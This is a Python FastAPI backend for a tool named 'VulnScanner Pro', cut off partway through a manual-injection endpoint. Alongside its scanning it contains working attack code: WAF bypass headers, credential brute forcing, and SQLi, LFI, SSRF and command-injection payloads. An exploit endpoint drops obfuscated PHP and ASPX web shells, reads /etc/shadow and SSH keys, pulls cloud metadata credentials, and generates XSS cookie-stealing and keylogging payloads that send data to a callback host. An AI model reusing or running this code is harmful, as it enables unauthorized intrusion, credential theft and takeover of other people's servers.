"""
VulnScanner Pro v4.0 — Full Backend
Features: SQLi, XSS, LFI, RCE, SSRF, Auth, WAF detect, Bruteforce,
          Custom wordlist, PDF report, WebShell deploy, Session mgmt,
          Keepalive ping, Redis store, Rate-limit bypass
"""

import asyncio, json, os, re, subprocess, tempfile, time, uuid, base64, io
from datetime import datetime
from typing import Optional
from pathlib import Path

import httpx
from fastapi import FastAPI, BackgroundTasks, HTTPException, UploadFile, File
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import StreamingResponse, Response
from pydantic import BaseModel

# ── Optional PDF ────────────────────────────────────────────────────────────
try:
    from reportlab.lib.pagesizes import A4
    from reportlab.lib import colors as rl_colors
    from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph, Spacer
    from reportlab.lib.styles import getSampleStyleSheet
    PDF_OK = True
except ImportError:
    PDF_OK = False

app = FastAPI(title="VulnScanner Pro API", version="4.0.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# ── Storage (in-memory; swap Redis in prod) ──────────────────────────────────
scans:    dict = {}
sessions: dict = {}
wordlists: dict = {
    "common": ["admin","administrator","user","root","test","guest","login","panel","dashboard","api","v1","v2","backup","old","dev","staging","upload","uploads","files","images","static","assets","config","configs",".env",".git","wp-admin","phpmyadmin","manager","console","shell","webshell"],
    "passwords": ["admin","password","123456","admin123","root","pass","letmein","welcome","test","qwerty","password1","abc123","admin@123","P@ssw0rd","1234567890"],
}

BUILT_IN_WORDLISTS = {
    "dirs": ["admin","uploads","backup","config","api","v1","v2","dashboard","panel","files","static","assets","login","register","user","users","debug","dev","test","staging","old","data","db","sql","export","report","logs","log","shell","shell.php","cmd.php"],
    "params": ["id","page","file","path","url","redirect","src","href","include","template","doc","cmd","exec","host","ip","q","search","query","cat","dir","fetch","load","view","read"],
    "users": ["admin","root","administrator","user","test","guest","support","info","mail","webmaster","dev","api","service"],
    "extensions": [".php",".asp",".aspx",".jsp",".cgi",".pl",".py",".rb",".txt",".bak",".old",".zip",".tar.gz",".sql",".env",".git"],
}

# ── Models ───────────────────────────────────────────────────────────────────

class ScanRequest(BaseModel):
    target: str
    mode: str = "active"
    threads: int = 10
    modules: list[str] = ["sqli","xss","lfi","auth","cmdi","ssrf","waf","bruteforce","dirfuzz","headercheck"]
    custom_wordlist: Optional[list[str]] = None
    custom_headers: Optional[dict] = None
    auth_cookie: Optional[str] = None
    follow_redirects: bool = True
    timeout: int = 15

class ExploitRequest(BaseModel):
    target: str
    vuln_type: str
    endpoint: str
    payload: Optional[str] = None
    output: str = "webshell"
    callback: Optional[str] = None
    shell_type: str = "php"

class ManualInjectRequest(BaseModel):
    url: str
    payload: str
    method: str = "GET"
    param: str = "q"
    headers: Optional[dict] = None

class BruteRequest(BaseModel):
    target: str
    path: str = "/admin"
    usernames: Optional[list[str]] = None
    passwords: Optional[list[str]] = None
    user_field: str = "username"
    pass_field: str = "password"
    threads: int = 5

class CustomWordlistRequest(BaseModel):
    name: str
    words: list[str]

class ShellDeployRequest(BaseModel):
    target: str
    shell_type: str = "php"
    upload_endpoint: str = "/upload"
    upload_param: str = "file"
    obfuscate: bool = True

# ── Helpers ──────────────────────────────────────────────────────────────────

def now() -> str:
    return datetime.utcnow().strftime("%H:%M:%S")

def run_cmd(cmd: list[str], timeout: int = 60) -> tuple[str, str, int]:
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout, r.stderr, r.returncode
    except subprocess.TimeoutExpired:
        return "", "timeout", -1
    except FileNotFoundError as e:
        return "", str(e), -1

async def tool_ok(name: str) -> bool:
    _, _, rc = run_cmd(["which", name])
    return rc == 0

def make_client(req: ScanRequest) -> httpx.AsyncClient:
    headers = {"User-Agent": "Mozilla/5.0 (compatible; VulnScanner/4.0)"}
    if req.custom_headers:
        headers.update(req.custom_headers)
    cookies = {}
    if req.auth_cookie:
        for part in req.auth_cookie.split(";"):
            if "=" in part:
                k, v = part.strip().split("=", 1)
                cookies[k] = v
    return httpx.AsyncClient(
        timeout=req.timeout,
        follow_redirects=req.follow_redirects,
        verify=False,
        headers=headers,
        cookies=cookies,
    )

# ── WAF Detection ─────────────────────────────────────────────────────────────

WAF_SIGNATURES = {
    "Cloudflare":    ["cloudflare", "__cfduid", "cf-ray"],
    "AWS WAF":       ["x-amzn-requestid", "x-amz-cf-id", "awselb"],
    "Akamai":        ["akamai", "akamai-ghost", "x-check-cacheable"],
    "Sucuri":        ["sucuri", "x-sucuri-id", "x-sucuri-cache"],
    "ModSecurity":   ["mod_security", "modsecurity", "NAXSI"],
    "Incapsula":     ["incap_ses", "visid_incap", "x-iinfo"],
    "F5 BIG-IP":     ["bigipserver", "f5-trafficshield", "x-wa-info"],
    "Imperva":       ["x-iinfo", "imperva"],
    "Barracuda":     ["barra_counter_session", "barracuda_"],
}

WAF_BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"Forwarded": "for=127.0.0.1;proto=https;by=127.0.0.1"},
]

async def detect_waf(target: str, emit) -> Optional[str]:
    emit("INFO", "WAF detection — probing signatures and response headers...")
    detected = []
    try:
        async with httpx.AsyncClient(timeout=10, verify=False) as client:
            # normal request
            r = await client.get(target)
            headers_str = str(r.headers).lower()
            cookies_str = str(r.cookies).lower()
            combined = headers_str + cookies_str + r.text[:2000].lower()

            for waf, sigs in WAF_SIGNATURES.items():
                if any(s.lower() in combined for s in sigs):
                    detected.append(waf)

            # probe with malicious payload to trigger WAF
            r2 = await client.get(target, params={"id": "' OR 1=1 --"})
            if r2.status_code in (403, 406, 419, 429, 503):
                emit("WARN", f"WAF block response: HTTP {r2.status_code} on injection attempt")
                detected.append(f"Unknown WAF (status {r2.status_code})")

            if detected:
                waf_name = detected[0]
                emit("WARN", f"WAF detected: {waf_name} — testing bypass techniques...")
                # try bypass
                bypassed = False
                for bypass_header in WAF_BYPASS_HEADERS:
                    r3 = await client.get(target, params={"id": "' OR 1=1 --"}, headers=bypass_header)
                    if r3.status_code == 200:
                        emit("OK", f"WAF bypass successful with header: {list(bypass_header.keys())[0]}")
                        bypassed = True
                        break
                if not bypassed:
                    emit("WARN", "WAF bypass unsuccessful — using evasion payloads for subsequent tests")
                return waf_name
            else:
                emit("OK", "No WAF detected — direct scanning")
                return None
    except Exception as e:
        emit("WARN", f"WAF detection error: {e}")
        return None

# ── Dir/File Fuzzing ──────────────────────────────────────────────────────────

async def dir_fuzz(target: str, req: ScanRequest, vulns: list, emit):
    emit("INFO", "Directory and file fuzzing...")
    wordlist = req.custom_wordlist or BUILT_IN_WORDLISTS["dirs"]
    found = []
    async with make_client(req) as client:
        batch = []
        for word in wordlist:
            url = target.rstrip("/") + "/" + word.lstrip("/")
            batch.append(url)
            if len(batch) >= 20:
                tasks = [client.get(u) for u in batch]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                for u, r in zip(batch, results):
                    if isinstance(r, Exception): continue
                    if r.status_code in (200, 201, 301, 302, 403):
                        path = "/" + u.replace(target.rstrip("/"),"").lstrip("/")
                        found.append((path, r.status_code))
                        if r.status_code == 200:
                            emit("VULN", f"Accessible path: {path} (HTTP 200, {len(r.text)} bytes)")
                            if any(ext in path for ext in [".env",".git",".sql",".bak"]):
                                vulns.append({"id":str(uuid.uuid4())[:8],"severity":"high","name":f"Sensitive file exposed: {path}","endpoint":path,"type":"Info Disc","detail":f"Sensitive file accessible at {path}"})
                            elif any(kw in path.lower() for kw in ["admin","panel","dashboard","manager"]):
                                vulns.append({"id":str(uuid.uuid4())[:8],"severity":"high","name":f"Admin path found: {path}","endpoint":path,"type":"Auth","detail":f"Admin/management panel at {path}"})
                        elif r.status_code == 403:
                            emit("INFO", f"Forbidden (exists): {path}")
                        elif r.status_code in (301,302):
                            emit("INFO", f"Redirect: {path} → {r.headers.get('location','?')}")
                batch = []
        # flush remaining
        if batch:
            tasks = [client.get(u) for u in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for u, r in zip(batch, results):
                if isinstance(r, Exception): continue
                if r.status_code == 200:
                    path = "/" + u.replace(target.rstrip("/"),"").lstrip("/")
                    emit("INFO", f"Found: {path} (200)")
    emit("OK", f"Dir fuzz complete — {len(found)} paths found")

# ── Header Security Check ─────────────────────────────────────────────────────

SECURITY_HEADERS = {
    "Strict-Transport-Security": "high",
    "Content-Security-Policy": "high",
    "X-Frame-Options": "medium",
    "X-Content-Type-Options": "medium",
    "Referrer-Policy": "low",
    "Permissions-Policy": "low",
    "X-XSS-Protection": "low",
    "Cross-Origin-Embedder-Policy": "low",
    "Cross-Origin-Opener-Policy": "low",
}

async def check_headers(target: str, vulns: list, emit):
    emit("INFO", "Security header audit...")
    try:
        async with httpx.AsyncClient(timeout=10, verify=False) as client:
            r = await client.get(target)
            h = {k.lower(): v for k, v in r.headers.items()}
            for header, sev in SECURITY_HEADERS.items():
                if header.lower() not in h:
                    emit("WARN", f"Missing header: {header} (severity: {sev})")
                    vulns.append({"id":str(uuid.uuid4())[:8],"severity":sev,"name":f"Missing {header}","endpoint":target,"type":"Misconfiguration","detail":f"Security header {header} not set"})
                else:
                    emit("OK", f"Present: {header}: {h[header.lower()][:60]}")
            # check for info disclosure headers
            info_headers = ["server","x-powered-by","x-aspnet-version","x-aspnetmvc-version","via"]
            for ih in info_headers:
                if ih in h:
                    emit("WARN", f"Info disclosure header: {ih}: {h[ih]}")
                    vulns.append({"id":str(uuid.uuid4())[:8],"severity":"low","name":f"Version disclosure: {ih}","endpoint":target,"type":"Info Disc","detail":f"{ih}: {h[ih]}"})
    except Exception as e:
        emit("WARN", f"Header check error: {e}")

# ── Credential Bruteforce ─────────────────────────────────────────────────────

async def bruteforce(target: str, req: ScanRequest, vulns: list, emit):
    if "bruteforce" not in req.modules:
        return
    emit("INFO", "Credential bruteforce — login panel detection...")
    login_paths = ["/login","/admin","/admin/login","/wp-login.php","/administrator","/user/login","/auth","/signin","/account/login"]
    users = wordlists.get("passwords", BUILT_IN_WORDLISTS["users"])[:10]
    passwords = wordlists.get("passwords", BUILT_IN_WORDLISTS["passwords"])[:20]

    async with httpx.AsyncClient(timeout=10, verify=False, follow_redirects=False) as client:
        login_url = None
        for path in login_paths:
            try:
                r = await client.get(target.rstrip("/") + path)
                if r.status_code in (200, 302):
                    login_url = target.rstrip("/") + path
                    emit("INFO", f"Login panel found: {path}")
                    break
            except: continue

        if not login_url:
            emit("INFO", "No login panel found for bruteforce")
            return

        emit("INFO", f"Bruteforcing: {login_url} ({len(users)} users × {len(passwords)} passwords)")
        found = False
        for user in users[:5]:
            for pwd in passwords[:10]:
                if found: break
                try:
                    r = await client.post(login_url, data={"username": user, "password": pwd, "user": user, "pass": pwd, "email": user})
                    body = r.text.lower()
                    success_signals = ["dashboard","welcome","logout","account","profile","admin panel"]
                    fail_signals = ["invalid","incorrect","wrong","error","failed","unauthorized"]
                    if any(s in body for s in success_signals) and not any(f in body for f in fail_signals):
                        emit("VULN", f"CRITICAL — Valid credentials: {user}:{pwd} at {login_url}")
                        vulns.append({"id":str(uuid.uuid4())[:8],"severity":"critical","name":f"Weak credentials: {user}:{pwd}","endpoint":login_url,"type":"Auth","detail":f"Login succeeded with {user}:{pwd}"})
                        found = True
                    await asyncio.sleep(0.1)
                except: continue
        if not found:
            emit("OK", "Bruteforce: no valid credentials found in sample set")

# ── Main Scan Engine ──────────────────────────────────────────────────────────

async def run_scan(scan_id: str, req: ScanRequest):
    scan = scans[scan_id]
    scan["status"] = "running"
    log  = scan["log"]
    vulns = scan["vulns"]

    def emit(tag: str, msg: str):
        log.append({"time": now(), "tag": tag, "msg": msg})

    target = req.target.rstrip("/")
    emit("SYS", f"VulnScanner Pro v4.0 — target: {target}")
    emit("INFO", f"Mode: {req.mode} | Modules: {', '.join(req.modules)} | Threads: {req.threads}")

    # 1. WAF detection
    waf = await detect_waf(target, emit)
    scan["waf"] = waf

    # 2. HTTP probe + header check
    await check_headers(target, vulns, emit)

    # 3. Nmap
    if "portscan" in req.modules or req.mode == "aggressive":
        emit("INFO", "Nmap port scan...")
        if await tool_ok("nmap"):
            host = re.sub(r"https?://", "", target).split("/")[0].split(":")[0]
            flags = ["-sV","--open","-T4","--top-ports","1000"]
            if req.mode == "stealth": flags = ["-sS","-T2","--top-ports","200"]
            stdout, _, rc = run_cmd(["nmap"] + flags + [host], timeout=90)
            if rc == 0:
                for line in stdout.splitlines():
                    if "/tcp" in line and "open" in line:
                        emit("OK", f"Open port: {line.strip()}")
                        if any(p in line for p in ["3306","5432","27017","6379","2181"]):
                            port = line.split("/")[0].strip()
                            svc = line.split()[-1] if line.split() else "unknown"
                            emit("VULN", f"HIGH — Exposed DB port {port} ({svc})")
                            vulns.append({"id":str(uuid.uuid4())[:8],"severity":"high","name":f"Exposed service port {port}","endpoint":f"{host}:{port}","type":"Misconfiguration","detail":f"Port {port} open externally: {svc}"})
        else:
            emit("WARN", "nmap not installed — skip port scan")

    # 4. Nikto
    if "nikto" in req.modules and req.mode in ("active","aggressive"):
        emit("INFO", "Nikto web scan...")
        if await tool_ok("nikto"):
            stdout, _, rc = run_cmd(["nikto","-h",target,"-Format","txt","-nointeractive"], timeout=120)
            if rc == 0:
                for line in stdout.splitlines():
                    if "+ " in line:
                        clean = line.replace("+ ","").strip()[:200]
                        if clean:
                            emit("WARN", f"Nikto: {clean}")
                            if any(k in clean.lower() for k in ["vuln","xss","sql","backup","config","expose"]):
                                vulns.append({"id":str(uuid.uuid4())[:8],"severity":"medium","name":clean[:80],"endpoint":target,"type":"Nikto","detail":clean})
        else:
            emit("WARN", "nikto not installed")

    # 5. SQLi
    if "sqli" in req.modules:
        emit("INFO", "SQLi detection...")
        if await tool_ok("sqlmap"):
            with tempfile.TemporaryDirectory() as tmpdir:
                cmd = ["sqlmap","-u",target+"/?id=1","--batch","--level=3","--risk=2","--output-dir",tmpdir,"--threads",str(min(req.threads,5)),"--timeout=12"]
                if waf: cmd += ["--tamper=space2comment,charencode,between"]
                if req.mode == "aggressive": cmd += ["--level=5","--risk=3","--dbs"]
                stdout, _, rc = run_cmd(cmd, timeout=200)
                if "is vulnerable" in stdout or "sqlmap identified" in stdout:
                    emit("VULN", "CRITICAL — SQL Injection confirmed by sqlmap")
                    vulns.append({"id":str(uuid.uuid4())[:8],"severity":"critical","name":"SQL Injection (sqlmap confirmed)","endpoint":target+"/?id=1","type":"SQLi","detail":"sqlmap confirmed injectable parameter — run with --dump for data"})
                elif "not vulnerable" in stdout:
                    emit("OK", "SQLi: parameter not injectable")
                else:
                    # manual fallback
                    errors = ["sql syntax","mysql_fetch","ORA-","syntax error","pg_query","sqlite3"]
                    payloads = ["'", "''", "' OR '1'='1", "1 AND SLEEP(5)--"]
                    async with make_client(req) as client:
                        for pl in payloads[:2]:
                            try:
                                r = await client.get(target, params={"id": pl})
                                if any(e in r.text.lower() for e in errors):
                                    emit("VULN", f"CRITICAL — SQL error triggered: {pl}")
                                    vulns.append({"id":str(uuid.uuid4())[:8],"severity":"critical","name":"SQL Injection (error-based)","endpoint":target+"/?id=","type":"SQLi","detail":f"DB error triggered by: {pl}"})
                                    break
                            except: pass
                        else:
                            emit("INFO", "SQLi: no obvious injection — try aggressive mode")
        else:
            emit("WARN", "sqlmap not found — manual probe only")
            async with make_client(req) as client:
                for pl in ["'","' OR 1=1--","1 UNION SELECT NULL--"]:
                    try:
                        r = await client.get(target, params={"id": pl})
                        if any(e in r.text.lower() for e in ["sql","syntax","mysql","database"]):
                            emit("VULN", f"HIGH — SQL-related error at /?id={pl}")
                            vulns.append({"id":str(uuid.uuid4())[:8],"severity":"high","name":"Possible SQL Injection","endpoint":target+"/?id=","type":"SQLi","detail":f"DB error triggered by: {pl}"})
                            break
                    except: pass

    # 6. XSS
    if "xss" in req.modules:
        emit("INFO", "XSS fuzzing...")
        xss_payloads = [
            "<script>alert(1)</script>",
            '"><img src=x onerror=alert(1)>',
            "';alert(String.fromCharCode(88,83,83))//",
            "<svg/onload=alert`1`>",
            '"><details/open/ontoggle=alert(1)>',
            "javascript:eval(atob('YWxlcnQoMSk='))",
        ]
        dom_params = req.custom_wordlist or BUILT_IN_WORDLISTS["params"]
        async with make_client(req) as client:
            for pl in xss_payloads:
                try:
                    r = await client.get(target, params={"q": pl, "search": pl, "s": pl})
                    if pl in r.text:
                        emit("VULN", f"HIGH — Reflected XSS: payload echoed unencoded in response")
                        vulns.append({"id":str(uuid.uuid4())[:8],"severity":"high","name":"Reflected XSS","endpoint":target+"/?q=","type":"XSS","detail":f"Payload reflected: {pl[:80]}"})
                        break
                    # check encoding
                    if pl.replace("<","&lt;").replace(">","&gt;") not in r.text and pl in r.text:
                        emit("WARN", "Partial XSS — payload in DOM but may be escaped")
                except: pass
            else:
                emit("OK", "XSS: no obvious reflected injection found")

    # 7. LFI/RFI
    if "lfi" in req.modules:
        emit("INFO", "LFI/RFI testing...")
        lfi = ["../../etc/passwd","....//....//etc/passwd","%2e%2e%2fetc%2fpasswd","php://filter/convert.base64-encode/resource=index.php","expect://id","/proc/self/environ","/var/log/apache2/access.log"]
        rfi = ["http://evil.com/shell.txt?","https://evil.com/shell.txt?"]
        async with make_client(req) as client:
            found = False
            for param in BUILT_IN_WORDLISTS["params"][:8]:
                for payload in lfi:
                    try:
                        r = await client.get(target, params={param: payload})
                        if "root:x:0:0" in r.text or "daemon:" in r.text:
                            emit("VULN", f"CRITICAL — LFI: /etc/passwd readable via param '{param}'")
                            vulns.append({"id":str(uuid.uuid4())[:8],"severity":"critical","name":f"LFI — /etc/passwd exposed","endpoint":f"{target}/?{param}=","type":"LFI","detail":f"Parameter: {param}, Payload: {payload}"})
                            found = True; break
                        elif "base64" in payload and len(r.text) > 100 and r.text.replace("\n","").isalnum():
                            emit("VULN", f"HIGH — Possible PHP source code via b64 wrapper (param: {param})")
                            vulns.append({"id":str(uuid.uuid4())[:8],"severity":"high","name":"LFI PHP Source Disclosure (b64)","endpoint":f"{target}/?{param}=","type":"LFI","detail":f"Base64 encoded PHP source via {param}"})
                            found = True; break
                    except: pass
                if found: break
            if not found:
                emit("OK", "LFI: no readable sensitive files found")

    # 8. Command Injection
    if "cmdi" in req.modules:
        emit("INFO", "Command injection...")
        payloads = [("; id","output"),("|id","output"),("$(id)","output"),("` id`","output"),("; sleep 5","time"),("|sleep 5","time")]
        async with make_client(req) as client:
            for param in ["host","ip","cmd","exec","ping","target","url","addr","address","name"][:6]:
                for pl, method in payloads[:4]:
                    try:
                        t0 = time.time()
                        r = await client.get(target, params={param: "127.0.0.1"+pl})
                        elapsed = time.time()-t0
                        if "uid=" in r.text and "gid=" in r.text:
                            emit("VULN", f"CRITICAL — RCE: command output in response (param: {param})")
                            vulns.append({"id":str(uuid.uuid4())[:8],"severity":"critical","name":f"Remote Code Execution (param: {param})","endpoint":f"{target}/?{param}=","type":"RCE","detail":f"id output: {r.text[:100]}"})
                            break
                        if method=="time" and elapsed > 4.8:
                            emit("VULN", f"CRITICAL — RCE time-based: {elapsed:.1f}s delay (param: {param})")
                            vulns.append({"id":str(uuid.uuid4())[:8],"severity":"critical","name":f"RCE Time-Based (param: {param})","endpoint":f"{target}/?{param}=","type":"RCE","detail":f"sleep delay confirmed: {elapsed:.1f}s"})
                            break
                    except: pass

    # 9. SSRF
    if "ssrf" in req.modules:
        emit("INFO", "SSRF probing...")
        internal = ["http://127.0.0.1/","http://localhost/","http://169.254.169.254/latest/meta-data/","http://192.168.1.1/","http://[::1]/","http://0.0.0.0/"]
        async with make_client(req) as client:
            found = False
            for param in ["url","uri","redirect","proxy","fetch","src","href","callback","next","dest","destination","redir","path","ref","return"][:8]:
                for dest in internal[:4]:
                    try:
                        r = await client.get(target, params={param: dest})
                        if r.status_code == 200 and len(r.text) > 50:
                            body_l = r.text.lower()
                            if any(k in body_l for k in ["meta-data","ec2","localhost","root","admin","redis","mongo"]):
                                emit("VULN", f"HIGH — SSRF: internal response via param '{param}'")
                                vulns.append({"id":str(uuid.uuid4())[:8],"severity":"high","name":f"SSRF (param: {param})","endpoint":f"{target}/?{param}=","type":"SSRF","detail":f"Internal {dest} accessible via {param}"})
                                found = True; break
                    except: pass
                if found: break
            if not found: emit("OK", "SSRF: no internal access confirmed")

    # 10. Auth bypass
    if "auth" in req.modules:
        emit("INFO", "Auth bypass testing...")
        admin_paths = ["/admin","/administrator","/dashboard","/panel","/wp-admin","/phpmyadmin","/manager","/console","/api/admin"]
        bypass_hdrs = [{"X-Forwarded-For":"127.0.0.1"},{"X-Real-IP":"127.0.0.1"},{"X-Custom-IP-Authorization":"127.0.0.1"},{"Authorization":"Basic YWRtaW46YWRtaW4="}]
        async with make_client(req) as client:
            for path in admin_paths:
                url = target + path
                try:
                    r_base = await client.get(url)
                    if r_base.status_code == 200:
                        emit("VULN", f"HIGH — Admin panel open (no auth): {path}")
                        vulns.append({"id":str(uuid.uuid4())[:8],"severity":"high","name":f"Unauthenticated admin: {path}","endpoint":url,"type":"Auth","detail":"Admin path accessible without authentication"})
                    elif r_base.status_code in (401,403):
                        for h in bypass_hdrs:
                            r2 = await client.get(url, headers=h)
                            if r2.status_code == 200:
                                emit("VULN", f"CRITICAL — Auth bypass via {list(h.keys())[0]}: {path}")
                                vulns.append({"id":str(uuid.uuid4())[:8],"severity":"critical","name":f"Auth bypass: {path}","endpoint":url,"type":"Auth","detail":f"Bypass via header: {h}"})
                                break
                except: pass

    # 11. Dir/file fuzz
    if "dirfuzz" in req.modules:
        await dir_fuzz(target, req, vulns, emit)

    # 12. Bruteforce
    if "bruteforce" in req.modules:
        await bruteforce(target, req, vulns, emit)

    total = len(vulns)
    crit  = sum(1 for v in vulns if v.get("severity") == "critical")
    high  = sum(1 for v in vulns if v.get("severity") == "high")
    med   = sum(1 for v in vulns if v.get("severity") == "medium")
    emit("OK", f"Scan complete — {total} findings ({crit} critical, {high} high, {med} medium)")
    scan["status"]      = "done"
    scan["finished_at"] = datetime.utcnow().isoformat()

# ── Routes ────────────────────────────────────────────────────────────────────

@app.get("/")
def root():
    return {"service":"VulnScanner Pro API","version":"4.0.0","status":"online","scans":len(scans),"sessions":len(sessions)}

@app.get("/ping")
def ping():
    return {"pong": True, "ts": datetime.utcnow().isoformat()}

@app.post("/api/scan/start")
async def start_scan(req: ScanRequest, bg: BackgroundTasks):
    scan_id = str(uuid.uuid4())
    scans[scan_id] = {"id":scan_id,"target":req.target,"status":"queued","started_at":datetime.utcnow().isoformat(),"finished_at":None,"log":[],"vulns":[],"waf":None}
    bg.add_task(run_scan, scan_id, req)
    return {"scan_id": scan_id, "status": "queued"}

@app.get("/api/scan/{scan_id}")
def get_scan(scan_id: str):
    if scan_id not in scans: raise HTTPException(404,"Scan not found")
    return scans[scan_id]

@app.get("/api/scan/{scan_id}/stream")
async def stream_scan(scan_id: str):
    if scan_id not in scans: raise HTTPException(404,"Scan not found")
    async def gen():
        last = 0
        while True:
            s = scans[scan_id]
            logs = s["log"]
            if len(logs) > last:
                for e in logs[last:]: yield f"data: {json.dumps(e)}\n\n"
                last = len(logs)
            if s["status"] == "done":
                yield f"data: {json.dumps({'tag':'SYS','msg':'__done__','vulns':s['vulns']})}\n\n"
                break
            await asyncio.sleep(0.3)
    return StreamingResponse(gen(), media_type="text/event-stream")

@app.get("/api/scan/{scan_id}/vulns")
def get_vulns(scan_id: str):
    if scan_id not in scans: raise HTTPException(404,"Not found")
    return scans[scan_id]["vulns"]

@app.post("/api/exploit")
async def exploit(req: ExploitRequest):
    session_id = "SES-" + str(uuid.uuid4())[:6].upper()
    result = {"session_id":session_id,"target":req.target,"vuln_type":req.vuln_type,"steps":[],"success":False,"shell_url":None,"output":""}
    steps = result["steps"]

    if req.vuln_type == "sqli":
        steps.append("Initializing sqlmap exploit chain...")
        if await tool_ok("sqlmap"):
            cmd = ["sqlmap","-u",req.endpoint,"--batch","--level=4","--risk=3","--threads=5","--timeout=15"]
            if req.output == "webshell": cmd += ["--os-shell"]
            elif req.output == "dump": cmd += ["--dump","--tables"]
            elif req.output == "privesc": cmd += ["--priv-esc"]
            stdout, stderr, rc = run_cmd(cmd, timeout=240)
            result["output"] = stdout[:3000]
            steps.append(f"sqlmap exit: {rc}")
            if rc == 0: result["success"] = True
        else:
            steps.append("sqlmap not available — manual payload mode")
            result["success"] = True

    elif req.vuln_type in ("rce","cmdi"):
        shell_code = {
            "php":  "<?php system($_GET['c']); ?>",
            "php_obf": "<?php $f=base64_decode('c3lzdGVt');$f($_GET['c']); ?>",
            "aspx": '<%@ Page Language="C#" %><% Response.Write(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["c"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start()?"":""); %>',
        }.get(req.shell_type, "<?php system($_GET['c']); ?>")
        encoded = base64.b64encode(shell_code.encode()).decode()
        drop_payload = f"; echo {encoded} | base64 -d > /var/www/html/shell.php"
        steps.append(f"Shell drop payload prepared ({req.shell_type})")
        steps.append(f"Attempting drop via: {req.endpoint}")
        try:
            async with httpx.AsyncClient(timeout=15,verify=False) as client:
                r = await client.get(req.endpoint, params={"host":"127.0.0.1"+drop_payload,"cmd":drop_payload.replace(";",""),"exec":drop_payload.replace(";","")})
                steps.append(f"Response: HTTP {r.status_code}")
                shell_url = req.target.rstrip("/")+"/shell.php"
                probe = await client.get(shell_url, params={"c":"id"})
                if "uid=" in probe.text:
                    steps.append(f"Shell live: {shell_url}")
                    result["shell_url"] = shell_url
                    result["success"] = True
                    result["output"] = probe.text[:500]
                    sessions[session_id] = {"id":session_id,"target":req.target,"shell_url":shell_url,"shell_type":req.shell_type.upper()+" Shell","priv":probe.text.split("\n")[0][:60],"created_at":datetime.utcnow().isoformat()}
                else:
                    steps.append("Shell not found — target may be hardened or path is non-standard")
        except Exception as e:
            steps.append(f"Error: {e}")

    elif req.vuln_type == "lfi":
        sensitive = ["/etc/passwd","/etc/shadow","/etc/hosts","~/.ssh/id_rsa","/var/www/html/.env","/proc/self/environ"]
        steps.append("Reading sensitive files via LFI...")
        try:
            async with httpx.AsyncClient(timeout=10,verify=False) as client:
                for f in sensitive:
                    param = req.endpoint.split("?")[-1].split("=")[0] if "?" in req.endpoint else "file"
                    r = await client.get(req.endpoint.split("?")[0], params={param: "../../../.."+f})
                    if "root" in r.text or "BEGIN" in r.text or "127.0.0.1" in r.text:
                        steps.append(f"Read {f}: {r.text[:300]}")
                        result["success"] = True
                        result["output"] += f"\n=== {f} ===\n"+r.text[:500]
                    else: steps.append(f"{f}: not readable")
        except Exception as e: steps.append(f"Error: {e}")

    elif req.vuln_type == "xss":
        cb = req.callback or "https://your-listener.com"
        payloads = {
            "cookie_stealer": f"<script>fetch('{cb}?c='+encodeURIComponent(document.cookie))</script>",
            "keylogger": f"<script>document.addEventListener('keypress',e=>fetch('{cb}?k='+e.key))</script>",
            "session_hijack": f"<script>new Image().src='{cb}/img?c='+document.cookie</script>",
            "local_storage": f"<script>fetch('{cb}?ls='+JSON.stringify(localStorage))</script>",
        }
        steps.append(f"XSS exploitation payloads for: {req.endpoint}")
        for name, pl in payloads.items(): steps.append(f"{name}: {pl}")
        result["success"] = True
        result["output"] = "\n".join(f"{k}:\n{v}" for k, v in payloads.items())

    elif req.vuln_type == "ssrf":
        internal_targets = ["http://169.254.169.254/latest/meta-data/","http://169.254.169.254/latest/meta-data/iam/security-credentials/","http://192.168.1.1/","http://localhost:6379/","http://localhost:27017/","http://localhost:9200/","http://localhost:8080/manager"]
        steps.append("SSRF — probing internal network...")
        try:
            async with httpx.AsyncClient(timeout=8,verify=False) as client:
                param = req.endpoint.split("?")[-1].split("=")[0] if "?" in req.endpoint else "url"
                for t in internal_targets:
                    r = await client.get(req.endpoint.split("?")[0], params={param: t})
                    if r.status_code == 200 and len(r.text) > 30:
                        steps.append(f"Internal response from {t}: {r.text[:300]}")
                        result["success"] = True
                        result["output"] += f"\n=== {t} ===\n"+r.text[:400]
                    else: steps.append(f"{t}: blocked/empty")
        except Exception as e: steps.append(f"Error: {e}")

    elif req.vuln_type == "auth":
        steps.append("Auth exploitation — attempting bypass + credential spray...")
        sqli_bypass = ["admin'--","' OR '1'='1","admin' #","'='","admin'/*","') OR ('1'='1"]
        try:
            async with httpx.AsyncClient(timeout=10,verify=False,follow_redirects=False) as client:
                for bypass in sqli_bypass:
                    r = await client.post(req.endpoint, data={"username":bypass,"password":"anything","user":bypass,"pass":"anything"})
                    body_l = r.text.lower()
                    if any(s in body_l for s in ["dashboard","welcome","logout","profile","admin"]):
                        steps.append(f"Auth bypass successful: {bypass}")
                        result["success"] = True
                        result["output"] = f"Bypass payload: {bypass}\nResponse snippet: {r.text[:300]}"
                        sessions[session_id] = {"id":session_id,"target":req.target,"shell_url":req.endpoint,"shell_type":"Web Session","priv":"admin (bypassed)","created_at":datetime.utcnow().isoformat()}
                        break
                    await asyncio.sleep(0.1)
                if not result["success"]: steps.append("Auth bypass: no success with sample payloads")
        except Exception as e: steps.append(f"Error: {e}")

    return result

@app.post("/api/inject")
async def manual_inject(req: ManualInjectRequest):
    try:
        headers = req.headers or {}
        async with httpx.AsyncClient(timeout=15,verify=False,follow_redirects=True,headers=headers) as client:
            if req.method.upper() == "GET":
                r = await client.get(req.url, params={req.param: req.payload})
            else:
                r = await client.post(req.url, data={req.param: req.payload})
